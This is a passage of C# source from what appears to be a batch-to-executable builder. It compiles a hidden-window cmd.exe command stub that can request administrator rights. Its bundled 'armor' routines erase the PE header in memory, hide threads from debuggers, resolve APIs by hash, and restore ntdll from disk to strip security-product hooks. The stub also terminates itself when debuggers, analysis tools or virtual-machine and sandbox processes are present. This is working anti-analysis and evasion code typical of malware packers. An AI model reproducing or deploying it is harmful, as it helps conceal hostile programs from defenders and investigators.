            csBld.AppendLine("                        string rrVar = a1; string rrHive = ExpandVars(a2); string rrPath = ExpandVars(a3); string rrName = ExpandVars(a4);");
            csBld.AppendLine("                        string rrVal = TigerSystem.RegRead(rrHive, rrPath, rrName);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[rrVar] = rrVal; Variables[\"REG_RESULT\"] = rrVal; Environment.SetEnvironmentVariable(rrVar, rrVal); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 56: // RegWrite");
            csBld.AppendLine("                        string rwHive = ExpandVars(a1); string rwPath = ExpandVars(a2); string rwName = ExpandVars(a3);");
            csBld.AppendLine("                        string[] rwParts = (a4 ?? \"\").Split('|');");
            csBld.AppendLine("                        string rwData = ExpandVars(rwParts[0]);");
            csBld.AppendLine("                        string rwType = rwParts.Length > 1 ? rwParts[1] : \"SZ\";");
            csBld.AppendLine("                        bool rwOk = TigerSystem.RegWrite(rwHive, rwPath, rwName, rwData, rwType);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[\"REG_RESULT\"] = rwOk ? \"SUCCESS\" : \"FAILED\"; }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 57: // MemAlloc");
            csBld.AppendLine("                        string maVar = a1; int maSize = 1024; int.TryParse(ExpandVars(a2), out maSize);");
            csBld.AppendLine("                        string maPtr = TigerMemory.Alloc(maSize > 0 ? maSize : 1024);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[maVar] = maPtr; Variables[\"MEM_PTR\"] = maPtr; Environment.SetEnvironmentVariable(maVar, maPtr); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 58: // MemFree");
            csBld.AppendLine("                        string mfPtr = ExpandVars(a1);");
            csBld.AppendLine("                        lock (_threadLock) { if (Variables.ContainsKey(a1)) mfPtr = Variables[a1]; }");
            csBld.AppendLine("                        TigerMemory.Free(mfPtr);");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 59: // MemWriteStr");
            csBld.AppendLine("                        string mwPtr = ExpandVars(a1);");
            csBld.AppendLine("                        lock (_threadLock) { if (Variables.ContainsKey(a1)) mwPtr = Variables[a1]; }");
            csBld.AppendLine("                        string mwTxt = ExpandVars(a2);");
            csBld.AppendLine("                        TigerMemory.WriteString(mwPtr, mwTxt);");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 60: // MemReadStr");
            csBld.AppendLine("                        string mrVar = a1; string mrPtr = ExpandVars(a2);");
            csBld.AppendLine("                        lock (_threadLock) { if (Variables.ContainsKey(a2)) mrPtr = Variables[a2]; }");
            csBld.AppendLine("                        int mrLen = 256; int.TryParse(ExpandVars(a3), out mrLen);");
            csBld.AppendLine("                        string mrTxt = TigerMemory.ReadString(mrPtr, mrLen);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[mrVar] = mrTxt; Variables[\"MEM_TEXT\"] = mrTxt; Environment.SetEnvironmentVariable(mrVar, mrTxt); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 61: // SysInfo");
            csBld.AppendLine("                        string siVar = a1; string siProp = ExpandVars(a2);");
            csBld.AppendLine("                        string siVal = TigerSystem.GetSysInfo(siProp);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[siVar] = siVal; Variables[\"SYS_RESULT\"] = siVal; Environment.SetEnvironmentVariable(siVar, siVal); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 62: // NetPing");
            csBld.AppendLine("                        string npVar = a1; string npHost = ExpandVars(a2);");
            csBld.AppendLine("                        int npPort = 80; int.TryParse(ExpandVars(a3), out npPort);");
            csBld.AppendLine("                        int npTimeout = 2000; int.TryParse(ExpandVars(a4), out npTimeout);");
            csBld.AppendLine("                        string npRes = TigerSystem.NetPing(npHost, npPort, npTimeout);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[npVar] = npRes; Variables[\"PING_RESULT\"] = npRes; Environment.SetEnvironmentVariable(npVar, npRes); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 63: // VfsUnzip");
            csBld.AppendLine("                        string vuSrc = ExpandVars(a1); string vuPfx = ExpandVars(a2);");
            csBld.AppendLine("                        lock (_threadLock) { TigerSystem.UnzipToVfs(vuSrc, vuPfx, EmbeddedFiles); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                }");
            if (enableCff)
            {
                csBld.AppendLine("                curState = inst.NextStateId;");
                csBld.AppendLine("            }");
            }
            else
            {
                csBld.AppendLine("                ip++;");
                csBld.AppendLine("            }");
            }
            csBld.AppendLine("        }");
            csBld.AppendLine("");
            csBld.AppendLine("        private static string CleanBodyString(string body) {");
            csBld.AppendLine("            if (string.IsNullOrEmpty(body)) return \"\";");
            csBld.AppendLine("            body = body.Trim();");
            csBld.AppendLine("            while (body.StartsWith(\"(\") && body.EndsWith(\")\")) {");
            csBld.AppendLine("                body = body.Substring(1, body.Length - 2).Trim();");
            csBld.AppendLine("            }");
            csBld.AppendLine("            char[] trims = new[] { '&', ' ', '\\r', '\\n', '\\t' };");
            csBld.AppendLine("            return body.Trim(trims);");
            csBld.AppendLine("        }");
            csBld.AppendLine("");
            csBld.AppendLine("        private static List<string> SplitSubCommands(string cmd) {");
            csBld.AppendLine("            List<string> list = new List<string>();");
            csBld.AppendLine("            if (string.IsNullOrEmpty(cmd)) return list;");
            csBld.AppendLine("            StringBuilder sb = new StringBuilder();");
            csBld.AppendLine("            bool inQuotes = false;");
            csBld.AppendLine("            for (int i = 0; i < cmd.Length; i++) {");
            csBld.AppendLine("                char c = cmd[i];");
            csBld.AppendLine("                if (c == '\"') { inQuotes = !inQuotes; sb.Append(c); }");
            csBld.AppendLine("                else if (c == '^' && i + 1 < cmd.Length) { sb.Append(c); sb.Append(cmd[++i]); }");
            csBld.AppendLine("                else if (c == '&' && !inQuotes) {");
            csBld.AppendLine("                    if (i + 1 < cmd.Length && cmd[i + 1] == '&') i++;");
            csBld.AppendLine("                    string part = sb.ToString().Trim();");
            csBld.AppendLine("                    if (!string.IsNullOrEmpty(part)) list.Add(part);");
            csBld.AppendLine("                    sb.Length = 0;");
            csBld.AppendLine("                } else {");
            csBld.AppendLine("                    sb.Append(c);");
            csBld.AppendLine("                }");
            csBld.AppendLine("            }");
            csBld.AppendLine("            string last = sb.ToString().Trim();");
            csBld.AppendLine("            if (!string.IsNullOrEmpty(last)) list.Add(last);");
            csBld.AppendLine("            return list;");
            csBld.AppendLine("        }");
            csBld.AppendLine("");
            if (enableCff)
            {
                csBld.AppendLine("        private static void ExecuteSubCommand(string cmd, Dictionary<string, int> labels, List<VmCode> instrs, ref int ip, ref int curState, ref bool branched) {");
            }
            else
            {
                csBld.AppendLine("        private static void ExecuteSubCommand(string cmd, Dictionary<string, int> labels, ref int ip) {");
            }
            csBld.AppendLine("            cmd = cmd.Trim();");
            csBld.AppendLine("            if (string.IsNullOrEmpty(cmd)) return;");
            csBld.AppendLine("            List<string> subCmds = SplitSubCommands(cmd);");
            csBld.AppendLine("            foreach (string c in subCmds) {");
            csBld.AppendLine("                string sc = CleanBodyString(c);");
            csBld.AppendLine("                if (string.IsNullOrEmpty(sc)) continue;");
            csBld.AppendLine("                if (sc.StartsWith(\"echo \", StringComparison.OrdinalIgnoreCase)) {");
            csBld.AppendLine("                    Console.WriteLine(ExpandVars(sc.Substring(5)));");
            csBld.AppendLine("                } else if (sc.StartsWith(\"set /a \", StringComparison.OrdinalIgnoreCase)) {");
            csBld.AppendLine("                    string expr = sc.Substring(7).Trim().Trim('\"');");
            csBld.AppendLine("                    int eq = expr.IndexOf('=');");
            csBld.AppendLine("                    if (eq != -1) { lock (_threadLock) { Variables[expr.Substring(0, eq).Trim()] = EvalMath(expr.Substring(eq + 1)).ToString(); } }");
            csBld.AppendLine("                } else if (sc.StartsWith(\"set \", StringComparison.OrdinalIgnoreCase)) {");
            csBld.AppendLine("                    string expr = sc.Substring(4).Trim().Trim('\"');");
            csBld.AppendLine("                    int eq = expr.IndexOf('=');");
            csBld.AppendLine("                    if (eq != -1) { lock (_threadLock) { Variables[expr.Substring(0, eq).Trim()] = ExpandVars(expr.Substring(eq + 1)); } }");
            csBld.AppendLine("                } else if (sc.StartsWith(\"goto \", StringComparison.OrdinalIgnoreCase)) {");
            csBld.AppendLine("                    string tgt = ExpandVars(sc.Substring(5).Trim().TrimStart(':')).ToLowerInvariant();");
            csBld.AppendLine("                    if (tgt == \"eof\") { Environment.Exit(_exitCode); }");
            if (enableCff)
            {
                csBld.AppendLine("                    if (labels.ContainsKey(tgt)) { curState = instrs[labels[tgt]].StateId; branched = true; return; }");
            }
            else
            {
                csBld.AppendLine("                    if (labels.ContainsKey(tgt)) { ip = labels[tgt] - 1; return; }");
            }
            csBld.AppendLine("                } else if (sc.StartsWith(\"exit\", StringComparison.OrdinalIgnoreCase)) {");
            csBld.AppendLine("                    Match m = Regex.Match(sc, @\"exit(?:\\s+/b)?(?:\\s+(\\d+))?\", RegexOptions.IgnoreCase);");
            csBld.AppendLine("                    _exitCode = (m.Success && m.Groups[1].Success) ? int.Parse(m.Groups[1].Value) : 0;");
            csBld.AppendLine("                    Environment.Exit(_exitCode);");
            csBld.AppendLine("                } else {");
            csBld.AppendLine("                    ExecuteDirectProcess(ExpandVars(sc));");
            csBld.AppendLine("                }");
            csBld.AppendLine("            }");
            csBld.AppendLine("        }");
            csBld.AppendLine("");
            csBld.AppendLine("        private static void ExecuteDirectProcess(string cmdLine) {");
            csBld.AppendLine("            cmdLine = cmdLine.Trim();");
            csBld.AppendLine("            if (string.IsNullOrEmpty(cmdLine)) return;");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                ProcessStartInfo psi = new ProcessStartInfo();");
            csBld.AppendLine("                psi.FileName = \"cmd.exe\";");
            csBld.AppendLine("                psi.Arguments = \"/c \" + cmdLine;");
            csBld.AppendLine("                psi.UseShellExecute = false;");
            csBld.AppendLine("                psi.CreateNoWindow = " + noWindow + ";");
            csBld.AppendLine("                psi.WindowStyle = " + showWindow + ";");
            csBld.AppendLine("                using (Process proc = Process.Start(psi)) {");
            csBld.AppendLine("                    if (proc != null) {");
            csBld.AppendLine("                        proc.WaitForExit();");
            csBld.AppendLine("                        _exitCode = proc.ExitCode;");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                }");
            csBld.AppendLine("            } catch {");
            csBld.AppendLine("                _exitCode = 1;");
            csBld.AppendLine("            }");
            csBld.AppendLine("        }");
            csBld.AppendLine("");
            csBld.AppendLine("        private static void ExecutePipeStream(string rawCmd) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                ProcessStartInfo psi = new ProcessStartInfo();");
            csBld.AppendLine("                psi.FileName = \"cmd.exe\";");
            csBld.AppendLine("                psi.Arguments = \"/q\";");
            csBld.AppendLine("                psi.UseShellExecute = false;");
            csBld.AppendLine("                psi.RedirectStandardInput = true;");
            csBld.AppendLine("                psi.CreateNoWindow = " + noWindow + ";");
            csBld.AppendLine("                psi.WindowStyle = " + showWindow + ";");
            csBld.AppendLine("                using (Process proc = Process.Start(psi)) {");
            csBld.AppendLine("                    if (proc != null) {");
            csBld.AppendLine("                        proc.StandardInput.WriteLine(rawCmd);");
            csBld.AppendLine("                        proc.StandardInput.WriteLine(\"exit\");");
            csBld.AppendLine("                        proc.StandardInput.Close();");
            csBld.AppendLine("                        proc.WaitForExit();");
            csBld.AppendLine("                        _exitCode = proc.ExitCode;");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                }");
            csBld.AppendLine("            } catch {");
            csBld.AppendLine("                _exitCode = 1;");
            csBld.AppendLine("            }");
            csBld.AppendLine("        }");
            csBld.AppendLine("    }");
            csBld.AppendLine("}");
            string csSource = csBld.ToString();

            string tmpDir = Path.Combine(Path.GetTempPath(), "batc_build_" + Guid.NewGuid().ToString("N").Substring(0, 8));
            Directory.CreateDirectory(tmpDir);
            try
            {
                string csFile = Path.Combine(tmpDir, "App.cs");
                string manifestFile = Path.Combine(tmpDir, "app.manifest");

                File.WriteAllText(csFile, csSource, Encoding.UTF8);

                string execLevel = requireAdmin ? "requireAdministrator" : "asInvoker";
                string manifest = "<?xml version=\"1.0\" encoding=\"utf-8\"?><assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\"><security><requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"" + execLevel + "\" uiAccess=\"false\" /></requestedPrivileges></security></trustInfo></assembly>";
                File.WriteAllText(manifestFile, manifest, Encoding.UTF8);

                string targetType = hidden ? "winexe" : "exe";
                StringBuilder argsBld = new StringBuilder();
                argsBld.Append("/nologo /optimize+ /target:" + targetType + " /r:System.Data.dll /r:System.Windows.Forms.dll /r:System.Drawing.dll /r:System.IO.Compression.dll /r:System.IO.Compression.FileSystem.dll /out:\"" + Path.GetFullPath(outExePath) + "\" /win32manifest:\"" + manifestFile + "\" ");
                if (!string.IsNullOrEmpty(iconPath) && File.Exists(iconPath))
                {
                    argsBld.Append("/win32icon:\"" + Path.GetFullPath(iconPath) + "\" ");
                }
                argsBld.Append("\"" + csFile + "\"");

                ProcessStartInfo cscPsi = new ProcessStartInfo();
                cscPsi.FileName = cscPath;
                cscPsi.Arguments = argsBld.ToString();
                cscPsi.UseShellExecute = false;
                cscPsi.RedirectStandardOutput = true;
                cscPsi.RedirectStandardError = true;
                cscPsi.CreateNoWindow = true;

                using (Process proc = Process.Start(cscPsi))
                {
                    proc.WaitForExit();
                    string outStr = proc.StandardOutput.ReadToEnd();
                    string errStr = proc.StandardError.ReadToEnd();
                    if (proc.ExitCode != 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] CSC Build Error:");
                        if (!string.IsNullOrEmpty(outStr)) Console.WriteLine(outStr);
                        if (!string.IsNullOrEmpty(errStr)) Console.WriteLine(errStr);
                        Console.ResetColor();
                        return false;
                    }
                    return true;
                }
            }
            finally
            {
                try { if (Directory.Exists(tmpDir)) Directory.Delete(tmpDir, true); } catch { }
            }
        }

        private static string GenerateArmorSource(bool enableAntiVm)
        {
            string antiVmBlock = enableAntiVm ? @"
                // 5. Anti-VM & Sandbox Evasion
                if (Environment.ProcessorCount < 2) Terminate();
                string[] vmProcesses = new string[] {
                    ""vboxservice"", ""vboxtray"", ""vmtoolsd"", ""vmwaretray"", ""qemu-ga"",
                    ""sandboxiedcomlaunch"", ""sandboxierpcss"", ""joeboxserver""
                };
                foreach (Process p in Process.GetProcesses()) {
                    try {
                        string pName = p.ProcessName.ToLowerInvariant();
                        foreach (string bad in vmProcesses) {
                            if (pName == bad || pName.Contains(bad)) Terminate();
                        }
                    } catch { }
                }
" : "";

            return @"
    public static class TigerArmor {
        [DllImport(""kernel32.dll"", ExactSpelling = true, SetLastError = true)]
        private static extern bool IsDebuggerPresent();

        [DllImport(""kernel32.dll"", ExactSpelling = true, SetLastError = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport(""kernel32.dll"", SetLastError = true)]
        private static extern IntPtr GetModuleHandleA(string lpModuleName);

        [DllImport(""kernel32.dll"", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport(""ntdll.dll"", SetLastError = true)]
        private static extern int NtSetInformationThread(IntPtr threadHandle, int threadInformationClass, IntPtr threadInformation, int threadInformationLength);

        [DllImport(""kernel32.dll"")]
        private static extern IntPtr GetCurrentThread();

        public static void HideThread() {
            try {
                NtSetInformationThread(GetCurrentThread(), 0x11 /* ThreadHideFromDebugger */, IntPtr.Zero, 0);
            } catch { }
        }

        public static void CloakPeHeader() {
            try {
                IntPtr baseAddress = Process.GetCurrentProcess().MainModule.BaseAddress;
                uint oldProtect;
                if (VirtualProtect(baseAddress, (UIntPtr)64, 0x04 /* PAGE_READWRITE */, out oldProtect)) {
                    byte[] zeroes = new byte[64];
                    Marshal.Copy(zeroes, 0, baseAddress, 64);
                    VirtualProtect(baseAddress, (UIntPtr)64, oldProtect, out oldProtect);
                }
            } catch { }
        }

        public static uint HashDjb2(string str) {
            uint hash = 5381;
            foreach (char c in (str ?? """")) {
                hash = ((hash << 5) + hash) + (byte)c;
            }
            return hash;
        }

        public static IntPtr ResolveApiByHash(string moduleName, uint targetHash) {
            try {
                IntPtr hMod = GetModuleHandleA(moduleName);
                if (hMod == IntPtr.Zero) return IntPtr.Zero;
                int e_lfanew = Marshal.ReadInt32(hMod, 0x3C);
                int optHeaderOffset = e_lfanew + 24;
                short magic = Marshal.ReadInt16(hMod, optHeaderOffset);
                int exportRva = (magic == 0x20B)
                    ? Marshal.ReadInt32(hMod, optHeaderOffset + 112)
                    : Marshal.ReadInt32(hMod, optHeaderOffset + 96);
                if (exportRva == 0) return IntPtr.Zero;

                IntPtr pExport = new IntPtr(hMod.ToInt64() + exportRva);
                int numNames = Marshal.ReadInt32(pExport, 24);
                int funcRva = Marshal.ReadInt32(pExport, 28);
                int nameRva = Marshal.ReadInt32(pExport, 32);
                int ordinalRva = Marshal.ReadInt32(pExport, 36);

                IntPtr pFunctions = new IntPtr(hMod.ToInt64() + funcRva);
                IntPtr pNames = new IntPtr(hMod.ToInt64() + nameRva);
                IntPtr pOrdinals = new IntPtr(hMod.ToInt64() + ordinalRva);

                for (int i = 0; i < numNames; i++) {
                    int curNameRva = Marshal.ReadInt32(pNames, i * 4);
                    IntPtr pCurName = new IntPtr(hMod.ToInt64() + curNameRva);
                    string name = Marshal.PtrToStringAnsi(pCurName);
                    if (HashDjb2(name) == targetHash) {
                        short ordinal = Marshal.ReadInt16(pOrdinals, i * 2);
                        int targetFuncRva = Marshal.ReadInt32(pFunctions, ordinal * 4);
                        return new IntPtr(hMod.ToInt64() + targetFuncRva);
                    }
                }
            } catch { }
            return IntPtr.Zero;
        }

        public static bool ReloadPristineNtdll() {
            try {
                string sysDir = Environment.SystemDirectory;
                string ntdllDiskPath = Path.Combine(sysDir, ""ntdll.dll"");
                if (!File.Exists(ntdllDiskPath)) return false;

                byte[] diskBytes = File.ReadAllBytes(ntdllDiskPath);
                IntPtr hNtdll = GetModuleHandleA(""ntdll.dll"");
                if (hNtdll == IntPtr.Zero) return false;

                int e_lfanew = BitConverter.ToInt32(diskBytes, 0x3C);
                short numSections = BitConverter.ToInt16(diskBytes, e_lfanew + 6);
                short optHeaderSize = BitConverter.ToInt16(diskBytes, e_lfanew + 20);
                int sectionHeaderStart = e_lfanew + 24 + optHeaderSize;

                for (int i = 0; i < numSections; i++) {
                    int secOffset = sectionHeaderStart + (i * 40);
                    string secName = Encoding.ASCII.GetString(diskBytes, secOffset, 8).TrimEnd('\0');
                    if (secName == "".text"") {
                        int virtualAddress = BitConverter.ToInt32(diskBytes, secOffset + 12);
                        int sizeOfRawData = BitConverter.ToInt32(diskBytes, secOffset + 16);
                        int pointerToRawData = BitConverter.ToInt32(diskBytes, secOffset + 20);

                        IntPtr targetMem = new IntPtr(hNtdll.ToInt64() + virtualAddress);
                        uint oldProtect;
                        if (VirtualProtect(targetMem, (UIntPtr)sizeOfRawData, 0x40 /* PAGE_EXECUTE_READWRITE */, out oldProtect)) {
                            Marshal.Copy(diskBytes, pointerToRawData, targetMem, sizeOfRawData);
                            VirtualProtect(targetMem, (UIntPtr)sizeOfRawData, oldProtect, out oldProtect);
                            return true;
                        }
                    }
                }
            } catch { }
            return false;
        }

        public static void StartRaspWatchdog() {
            try {
                System.Threading.Thread watchdog = new System.Threading.Thread(() => {
                    while (true) {
                        try {
                            HideThread();
                            if (Debugger.IsAttached || IsDebuggerPresent()) Terminate();
                            bool remoteDbg = false;
                            if (CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remoteDbg) && remoteDbg) {
                                Terminate();
                            }
                        } catch { }
                        System.Threading.Thread.Sleep(600);
                    }
                });
                watchdog.IsBackground = true;
                watchdog.Start();
            } catch { }
        }

        public static void VerifyEnvironment() {
            try {
                HideThread();
                ReloadPristineNtdll();
                StartRaspWatchdog();
                // 1. Check Managed Debugger
                if (Debugger.IsAttached) Terminate();

                // 2. Check Native Win32 Debugger
                if (IsDebuggerPresent()) Terminate();

                // 3. Check Remote Debugger
                bool remoteDbg = false;
                if (CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remoteDbg) && remoteDbg) {
                    Terminate();
                }

                // 4. Scan Blacklisted Reverse Engineering & Analysis Processes
                string[] exactList = new string[] { ""ida"", ""ida64"", ""idag"", ""idag64"" };
                string[] subList = new string[] {
                    ""dnspy"", ""x64dbg"", ""x32dbg"", ""procmon"", ""procmon64"",
                    ""processhacker"", ""cheatengine"", ""wireshark"", ""fiddler"",
                    ""httpdebugger"", ""scylla"", ""pe-sieve""
                };

                foreach (Process p in Process.GetProcesses()) {
                    try {
                        string pName = p.ProcessName.ToLowerInvariant();
                        foreach (string ex in exactList) {
                            if (pName == ex || pName.StartsWith(ex + ""."")) {
                                Terminate();
                            }
                        }
                        foreach (string bad in subList) {
                            if (pName.Contains(bad)) {
                                Terminate();
                            }
                        }
                    } catch { }
                }
" + antiVmBlock + @"
            } catch { }
        }

        private static void Terminate() {
            try {
                Process.GetCurrentProcess().Kill();
            } catch {
                Environment.Exit(0xDEAD);
            }
        }
    }
";
        }

        private static string FindCsc()
        {
            string[] paths = new[]
            {
                @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
                @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
                @"C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe",
            };
            foreach (string p in paths) if (File.Exists(p)) return p;
            return null;
        }
        #endregion
    }
}
